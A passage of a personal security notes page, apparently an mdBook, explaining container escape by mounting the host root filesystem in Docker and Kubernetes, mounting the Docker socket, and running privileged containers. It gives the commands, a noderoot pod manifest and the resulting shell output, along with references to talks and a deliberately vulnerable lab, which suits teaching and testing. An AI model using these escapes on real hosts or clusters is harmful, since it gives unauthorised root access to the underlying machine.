<li><a href="https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg">Gynvael's Youtube Channel</a></li>
</ul>
<h1><a class="header" href="#containers--kubernetes" id="containers--kubernetes">Containers &amp; Kubernetes</a></h1>
<ul>
<li><a href="k8s/./hostpath.html">HostPath</a></li>
<li><a href="k8s/./kubesec-sdk.html">Attacking Kube_Security_Lab w/ Client-go</a></li>
</ul>
<h1><a class="header" href="#hostpath" id="hostpath">HostPath</a></h1>
<p>Abusing HostPath to escape containers.</p>
<hr />
<h2><a class="header" href="#mounting-root-volumes-inside-containers" id="mounting-root-volumes-inside-containers">Mounting Root Volumes Inside Containers</a></h2>
<h3><a class="header" href="#docker" id="docker">Docker</a></h3>
<p>Run an alpine container with root filesystem mounted under <code>/host</code> in the container</p>
<pre><code>$ docker run --rm -it -v /:/host alpine:latest /bin/sh
$ / # cat /etc/os-release
NAME=&quot;Alpine Linux&quot;
ID=alpine
VERSION_ID=3.12.0
PRETTY_NAME=&quot;Alpine Linux v3.12&quot;
HOME_URL=&quot;https://alpinelinux.org/&quot;
BUG_REPORT_URL=&quot;https://bugs.alpinelinux.org/&quot;
</code></pre>
<p>Changing my root directory to the <code>/host</code> directory with <code>chroot</code> allows us to break out of the container.</p>
<pre><code>/ # ls
bin    etc    host   media  opt    root   sbin   sys    usr
dev    home   lib    mnt    proc   run    srv    tmp    var

/ # chroot /host bash
groups: cannot find name for group ID 11
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.
root@3396f9188944:/# 
</code></pre>
<p>Show release information has changed to Ubuntu (WSL)</p>
<pre><code>root@3396f9188944:/# cat /etc/os-release
NAME=&quot;Ubuntu&quot;
VERSION=&quot;20.04.1 LTS (Focal Fossa)&quot;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&quot;Ubuntu 20.04.1 LTS&quot;
VERSION_ID=&quot;20.04&quot;
...&lt;snip&gt;...
</code></pre>
<p>Access to drives on the host</p>
<pre><code>$ root@3396f9188944:/# df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sdb        251G   28G  211G  12% /
tools           1.8T  1.7T  131G  93% /init
none             13G     0   13G   0% /dev
tmpfs            13G     0   13G   0% /sys/fs/cgroup
...&lt;snip&gt;...
tmpfs            13G     0   13G   0% /mnt/wsl
C:\             1.8T  1.7T  131G  93% /mnt/c
D:\             112G   11G  102G  10% /mnt/d
</code></pre>
<h3><a class="header" href="#kubernetes" id="kubernetes">Kubernetes</a></h3>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: noderoot
spec:
  containers:
  - name: noderoot
    image: raesene/alpine-containertools
    imagePullPolicy: Always
    volumeMounts:
    - name: root
      mountPath: &quot;/host&quot;
  volumes:
  - name: root
    hostPath: 
      path: &quot;/&quot;
</code></pre>
<p>Exec into pod to see mounted host directory just like docker</p>
<pre><code>$ kubectl apply -f noderoot.yaml
pod/noderoot created

$ kubectl exec -it pod/noderoot -- /bin/bash
bash-5.0# chroot /host bash
[root@noderoot /]# 
</code></pre>
<p><code>chroot</code> onto the host</p>
<pre><code>[root@noderoot /]# cat /etc/os-release
NAME=Fedora
VERSION=&quot;33.20210104.3.1 (CoreOS)&quot;
ID=fedora
VERSION_ID=33
VERSION_CODENAME=&quot;&quot;
PLATFORM_ID=&quot;platform:f33&quot;
PRETTY_NAME=&quot;Fedora CoreOS 33.20210104.3.1&quot;
...&lt;snip&gt;...
</code></pre>
<h3><a class="header" href="#docker-socket" id="docker-socket">Docker Socket</a></h3>
<p>The docker socker on the host is located at <code>/var/run/docker.sock</code>. Mounting this inside a container will allow processes running inside the container to interact with the docker daemon, and run additional containers.</p>
<pre><code>$ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker /bin/sh
/ # docker version
Client: Docker Engine - Community
 Version:           20.10.2
 API version:       1.41
 Go version:        go1.13.15
 Git commit:        2291f61
 Built:             Mon Dec 28 16:11:26 2020
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
...&lt;snip&gt;...
</code></pre>
<p>We can even see our own container running.</p>
<pre><code>/ # docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED              STATUS              PORTS     NAMES
e52efd14f85c   docker    &quot;docker-entrypoint.s…&quot;   About a minute ago   Up About a minute             dreamy_poincare
</code></pre>
<h3><a class="header" href="#privileged-containers" id="privileged-containers">Privileged Containers</a></h3>
<p>Although we have complete access to the hosts filesystem, we still lack some capabilities we'd want to completely bypass all restrictions of the container and get true <code>root</code>.</p>
<p>Use <code>capsh</code> to show some capabilities are missing, such as <code>cap_sys_admin</code>, the biggest bundle of privileges.</p>
<pre><code>root@3396f9188944:/# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
</code></pre>
<p>Run the container again, but using privileged flag and see we have <code>cap_sys_admin</code> and have truely broken out as <code>root</code>.</p>
<pre><code>$ docker run --rm -it --privileged -v /:/host alpine:latest /bin/sh
/ # chroot /host bash
groups: cannot find name for group ID 11
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.

root@33507db52673:/# capsh --print
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
...
</code></pre>
<hr />
<h2><a class="header" href="#references-3" id="references-3">References</a></h2>
<ul>
<li><a href="https://linux-audit.com/linux-capabilities-101/">Linux Capabilities</a></li>
<li><a href="https://www.youtube.com/watch?v=HmoVSmTIOxM">The Path Less Traveled: Abusing K8s Defaults - Ian Coldwater &amp; Duffy Cooley</a></li>
<li><a href="https://www.youtube.com/watch?v=OPuu8wsu2Zc">Seccomp Security Profiles and You - Duffy Cooley</a></li>
<li><a href="https://github.com/madhuakula/kubernetes-goat">Kubernetes Goat - Intentional Vulnerable K8s Cluster</a></li>
</ul>
<h1><a class="header" href="#kube_security_lab-w-client-go" id="kube_security_lab-w-client-go">Kube_Security_Lab w/ Client-go</a></h1>
<h1><a class="header" href="#ctf-write-ups" id="ctf-write-ups">CTF Write-ups</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
